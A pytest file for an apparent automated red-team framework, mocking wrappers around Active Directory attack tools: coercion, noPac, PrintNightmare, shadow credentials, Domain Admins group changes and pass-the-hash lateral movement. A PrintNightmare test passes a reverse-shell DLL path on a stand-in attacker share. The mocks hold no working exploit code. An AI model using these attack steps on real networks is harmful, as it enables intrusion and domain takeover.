"""Tests for red team network penetration testing tools."""

from datetime import datetime, timezone
from unittest.mock import patch

import pytest

from ares.core.models import (
    InvestigationStage,
    RedTeamState,
    Target,
)


class MockRunResult:
    """Mock result for run_remote function."""

    def __init__(self, stdout: str = "", stderr: str = "", return_code: int = 0):
        self.stdout = stdout
        self.stderr = stderr
        self.return_code = return_code


@pytest.fixture
def red_team_state() -> RedTeamState:
    """Create a basic red team state for testing."""
    return RedTeamState(
        operation_id="op-test-001",
        target=Target(ip="192.168.1.100", hostname="dc01", domain="test.local"),
        started_at=datetime.now(timezone.utc),
        stage=InvestigationStage.TRIAGE,
        hosts=[],
        users=[],
        credentials=[],
        hashes=[],
        shares=[],
        weaknesses=[],
        timeline=[],
        identified_techniques=set(),
        has_domain_admin=False,
        has_golden_ticket=False,
        report_summary=None,
    )


class TestRunToolFunction:
    """Tests for _run_tool helper function."""

    def test_run_tool_success(self):
        """Test successful command execution."""
        from ares.tools.red.network import _run_tool

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="output", stderr="", return_code=0)
            stdout, stderr, code = _run_tool(["echo", "test"])

        assert stdout == "output"
        assert stderr == ""
        assert code == 0

    def test_run_tool_failure(self):
        """Test failed command execution."""
        from ares.tools.red.network import _run_tool

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="", stderr="error", return_code=1)
            _stdout, stderr, code = _run_tool(["invalid", "command"])

        assert stderr == "error"
        assert code == 1


class TestNetworkEnumerationTools:
    """Tests for NetworkEnumerationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_nmap_scan_success(self, red_team_state: RedTeamState):
        """Test successful nmap scan."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="PORT   STATE SERVICE\n22/tcp open  ssh\n",
                stderr="",
                return_code=0,
            )
            result = tools.nmap_scan("192.168.1.100")

        assert "PORT" in result
        assert "22/tcp" in result
        assert "192.168.1.100" in red_team_state.queried_hosts

    def test_nmap_scan_failure(self, red_team_state: RedTeamState):
        """Test nmap scan failure."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="", stderr="Host unreachable", return_code=1
            )
            result = tools.nmap_scan("192.168.1.100")

        assert "unreachable" in result.lower() or "failed" in result.lower()

    def test_nmap_scan_exception(self, red_team_state: RedTeamState):
        """Test nmap scan handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection error")
            result = tools.nmap_scan("192.168.1.100")

        assert "failed" in result.lower()

    def test_nmap_scan_multiple_targets(self, red_team_state: RedTeamState):
        """Test nmap scan with multiple targets."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Scan complete", return_code=0)
            tools.nmap_scan("192.168.1.100 192.168.1.101")

        # Both hosts should be tracked
        assert "192.168.1.100" in red_team_state.queried_hosts
        assert "192.168.1.101" in red_team_state.queried_hosts

    def test_enumerate_users_success(self, red_team_state: RedTeamState):
        """Test successful user enumeration."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator\nuser1\nuser2", return_code=0
            )
            result = tools.enumerate_users(
                target="192.168.1.100",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Administrator" in result

    def test_enumerate_users_null_session(self, red_team_state: RedTeamState):
        """Test user enumeration with null session."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Anonymous\n", return_code=0)
            tools.enumerate_users(target="192.168.1.100", username="", password="")

        # Should work without credentials
        mock_run.assert_called_once()

    def test_enumerate_users_exception(self, red_team_state: RedTeamState):
        """Test user enumeration handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Auth failed")
            result = tools.enumerate_users(
                target="192.168.1.100",
                username="user",
                password="wrong",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_enumerate_shares_success(self, red_team_state: RedTeamState):
        """Test successful share enumeration."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="ADMIN$ READ,WRITE\nC$ READ\nSHARE1 READ", return_code=0
            )
            result = tools.enumerate_shares(
                target="192.168.1.100",
                domain="TEST",
                username="admin",
                password="pass",  # pragma: allowlist secret
            )

        assert "ADMIN$" in result or "SHARE1" in result

    def test_enumerate_shares_exception(self, red_team_state: RedTeamState):
        """Test share enumeration handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.enumerate_shares(
                target="192.168.1.100",
                username="user",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestCredentialHarvestingTools:
    """Tests for CredentialHarvestingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_check_smb_connectivity_success(self, red_team_state: RedTeamState):
        """Test SMB connectivity check success."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="open", return_code=0)
            success, _msg = tools._check_smb_connectivity("192.168.1.100")

        assert success is True

    def test_check_smb_connectivity_failure(self, red_team_state: RedTeamState):
        """Test SMB connectivity check failure."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="closed", return_code=1)
            success, _msg = tools._check_smb_connectivity("192.168.1.100")

        assert success is False


class TestCrackingTools:
    """Tests for CrackingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CrackingTools

        tools = CrackingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CrackingTools

        tools = CrackingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestSharePilferingTools:
    """Tests for SharePilferingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import SharePilferingTools

        tools = SharePilferingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import SharePilferingTools

        tools = SharePilferingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestGoldenTicketTools:
    """Tests for GoldenTicketTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import GoldenTicketTools

        tools = GoldenTicketTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import GoldenTicketTools

        tools = GoldenTicketTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestBloodHoundTools:
    """Tests for BloodHoundTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import BloodHoundTools

        tools = BloodHoundTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import BloodHoundTools

        tools = BloodHoundTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestCertipyTools:
    """Tests for CertipyTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestDelegationTools:
    """Tests for DelegationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import DelegationTools

        tools = DelegationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import DelegationTools

        tools = DelegationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestRedTeamReportingTools:
    """Tests for RedTeamReportingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import RedTeamReportingTools

        tools = RedTeamReportingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import RedTeamReportingTools

        tools = RedTeamReportingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestCoercionTools:
    """Tests for CoercionTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_petitpotam_unauthenticated(self, red_team_state: RedTeamState):
        """Test PetitPotam unauthenticated coercion."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully coerced authentication", return_code=0
            )
            result = tools.petitpotam("192.168.56.10", "192.168.56.100")

        assert "success" in result.lower()
        mock_run.assert_called_once()

    def test_petitpotam_authenticated(self, red_team_state: RedTeamState):
        """Test PetitPotam authenticated coercion."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Successfully coerced", return_code=0)
            result = tools.petitpotam(
                "192.168.56.10",
                "192.168.56.100",
                username="user",
                password="pass",  # pragma: allowlist secret
                domain="test.local",
            )

        assert "success" in result.lower()

    def test_petitpotam_failure(self, red_team_state: RedTeamState):
        """Test PetitPotam failure handling."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.petitpotam("192.168.56.10", "192.168.56.100")

        assert "failed" in result.lower()

    def test_coercer_success(self, red_team_state: RedTeamState):
        """Test Coercer tool success."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Triggered authentication via MS-EFSRPC", return_code=0
            )
            result = tools.coercer(
                "192.168.56.10",
                "192.168.56.100",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
            )

        assert "triggered" in result.lower()

    def test_coercer_exception(self, red_team_state: RedTeamState):
        """Test Coercer exception handling."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Timeout")
            result = tools.coercer(
                "192.168.56.10",
                "192.168.56.100",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
            )

        assert "failed" in result.lower()


class TestMSSQLTools:
    """Tests for MSSQLTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_mssql_login_success(self, red_team_state: RedTeamState):
        """Test MSSQL login success."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="master\ntempdb\nIMPERSONATE permission found", return_code=0
            )
            result = tools.mssql_login(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                domain="test.local",
            )

        assert "impersonate" in result.lower()

    def test_mssql_login_exception(self, red_team_state: RedTeamState):
        """Test MSSQL login exception handling."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.mssql_login(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_mssql_xp_cmdshell_success(self, red_team_state: RedTeamState):
        """Test xp_cmdshell command execution."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.mssql_xp_cmdshell(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
                domain="test.local",
                impersonate="sa",
            )

        assert "system" in result.lower()

    def test_mssql_xp_cmdshell_exception(self, red_team_state: RedTeamState):
        """Test xp_cmdshell exception handling."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.mssql_xp_cmdshell(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
            )

        assert "failed" in result.lower()


class TestACLExploitTools:
    """Tests for ACLExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_pywhisker_add_success(self, red_team_state: RedTeamState):
        """Test pywhisker shadow credentials success."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Shadow credentials saved to admin.pfx", return_code=0
            )
            result = tools.pywhisker(
                "Administrator",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert ".pfx" in result.lower() or "shadow" in result.lower()

    def test_pywhisker_exception(self, red_team_state: RedTeamState):
        """Test pywhisker exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.pywhisker(
                "Administrator",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_add_group_member_success(self, red_team_state: RedTeamState):
        """Test bloodyAD group member addition."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully added user to Domain Admins", return_code=0
            )
            result = tools.bloodyad_add_group_member(
                "controlled_user",
                "Domain Admins",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "added" in result.lower() or "success" in result.lower()

    def test_bloodyad_add_group_member_exception(self, red_team_state: RedTeamState):
        """Test bloodyAD group member exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Insufficient rights")
            result = tools.bloodyad_add_group_member(
                "user",
                "Domain Admins",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_set_password_success(self, red_team_state: RedTeamState):
        """Test bloodyAD password reset."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Password changed successfully", return_code=0
            )
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "reset" in result.lower() or "changed" in result.lower()

    def test_bloodyad_set_password_exception(self, red_team_state: RedTeamState):
        """Test bloodyAD password reset exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()


class TestCVEExploitTools:
    """Tests for CVEExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_nopac_success(self, red_team_state: RedTeamState):
        """Test noPac exploitation success."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator hash: aad3b435b51404eeaad3b435b51404ee",
                return_code=0,
            )
            result = tools.nopac(
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
                "DC01",
            )

        assert "hash" in result.lower() or "admin" in result.lower()

    def test_nopac_exception(self, red_team_state: RedTeamState):
        """Test noPac exception handling."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Target patched")
            result = tools.nopac(
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
                "DC01",
            )

        assert "failed" in result.lower()

    def test_printnightmare_success(self, red_team_state: RedTeamState):
        """Test PrintNightmare exploitation."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="DLL executed successfully", return_code=0)
            result = tools.printnightmare(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "success" in result.lower() or "executed" in result.lower()

    def test_printnightmare_exception(self, red_team_state: RedTeamState):
        """Test PrintNightmare exception handling."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Spooler disabled")
            result = tools.printnightmare(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "failed" in result.lower()


class TestTrustAttackTools:
    """Tests for TrustAttackTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_raise_child_success(self, red_team_state: RedTeamState):
        """Test raise_child domain escalation."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Enterprise Admin golden ticket created", return_code=0
            )
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "enterprise admin" in result.lower() or "golden ticket" in result.lower()

    def test_raise_child_with_target_domain(self, red_team_state: RedTeamState):
        """Test raise_child with explicit target domain."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Escalation successful", return_code=0)
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
                target_domain="test.local",
            )

        assert "success" in result.lower() or "escalation" in result.lower()

    def test_raise_child_exception(self, red_team_state: RedTeamState):
        """Test raise_child exception handling."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Trust not found")
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestLateralMovementTools:
    """Tests for LateralMovementTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_evil_winrm_with_password(self, red_team_state: RedTeamState):
        """Test evil-winrm with password authentication."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="test\\administrator\nDC01\n", return_code=0
            )
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "administrator" in result.lower()

    def test_evil_winrm_with_hash(self, red_team_state: RedTeamState):
        """Test evil-winrm with pass-the-hash."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "system" in result.lower()

    def test_evil_winrm_no_creds(self, red_team_state: RedTeamState):
        """Test evil-winrm without credentials fails gracefully."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        result = tools.evil_winrm("192.168.56.10", "administrator")

        assert "error" in result.lower()

    def test_evil_winrm_exception(self, red_team_state: RedTeamState):
        """Test evil-winrm exception handling."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("WinRM disabled")
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_psexec_with_password(self, red_team_state: RedTeamState):
        """Test psexec with password authentication."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
                domain="test.local",
                command="whoami",
            )

        assert "system" in result.lower()

    def test_psexec_with_hash(self, red_team_state: RedTeamState):
        """Test psexec with pass-the-hash."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="C:\\Windows>", return_code=0)
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "windows" in result.lower()

    def test_psexec_exception(self, red_team_state: RedTeamState):
        """Test psexec exception handling."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("SMB blocked")
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()
